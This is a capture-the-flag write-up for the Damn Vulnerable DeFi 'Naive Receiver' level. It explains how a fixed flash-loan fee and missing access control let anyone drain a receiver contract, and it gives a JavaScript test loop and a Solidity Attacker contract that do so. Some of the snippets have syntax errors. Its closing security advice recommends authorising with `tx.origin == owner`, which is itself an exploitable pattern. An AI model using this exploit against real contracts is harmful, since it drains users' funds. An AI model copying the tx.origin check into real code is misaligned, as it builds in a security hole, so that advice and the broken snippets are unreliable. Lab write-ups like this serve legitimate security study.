# Level 2 : Naive Receiver

Regarding the description, the idea is to drain funds from a contract that interact with a pool.

Contract to attack has 10 ETH and pool has 1000 ETH in balance.

We can call the `flashLoan()` function with 2 arguments : the borrower and borrowamount.

After that, `flashLoan()` with send to the caller contract `borrowamount` and get back `borrowamount + fee` (1 ETH) using `borrower.functionCallWithValue(…)`

As the fee of 1 ETH is a FIXED_FEE , even if we call the function to borrow 0 ETH we will have to pay 1 ETH, this is the first point of failure.

The second point of failure is that in the second contract, there’s no proper access control that check inside `receiveEther()` allowing anyone to call this function and make it pay 1 ETH.

Even more, there’s is no proper verification that the contract is actually receiving ETH before paying out the fee value, it’s like a give away function to the pool.

### Attack

As the description say , there is 2 way to attack the contract, one long and one short. Both get the same logic : calling 10 times the ****`FlashLoanReceiver`****

- **Long Solution**

```jsx
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  for (i = 1; i <= 10; i++) {
    await this.pool.connect(attacker).flashLoan(this.receiver.address, 0)
    console.log(i, String(await ethers.provider.getBalance(this.receiver.address)))
  }
}
```

- **Short Solution : make a contract do the job for us**
    - Create contract in ./damn-vulnerable-defi/contracts/naive-receiver/
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    import "./NaiveReceiverLenderPool.sol";
    contract Attacker {
        NaiveReceiverLenderPool public pool;
        constructor(address payable _pool) {
            pool = NaiveReceiverLenderPool(_pool);
        }
        function attack(address _receiver) external {
            for (uint256 i = 0; i < 10; i++) {
                pool.flashLoan(_receiver, 0);
            }
        }
    }
    ```
    
    - Add these lines to your `naive-receiver.challenge.js` :
    
    ```jsx
    it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE */
          	const Attacker = await ethers.getContractFactory('Attacker', attacker)
          	this.attackerContract = await Attacker.deploy(this.pool.address)
          	// Attack
          	await this.attackerContract.connect(attacker).attack(this.receiver.address)
          	)
        });
    ```
    

### Key Security Takeaways

- Maybe calcul difference between ETH received and ETH transferred would be a useful thing to do 🙂
- Always implement access control by creating role like owner or admin and use it with `require()` at the beginning of your function
    
    `require(tx.origin == owner);`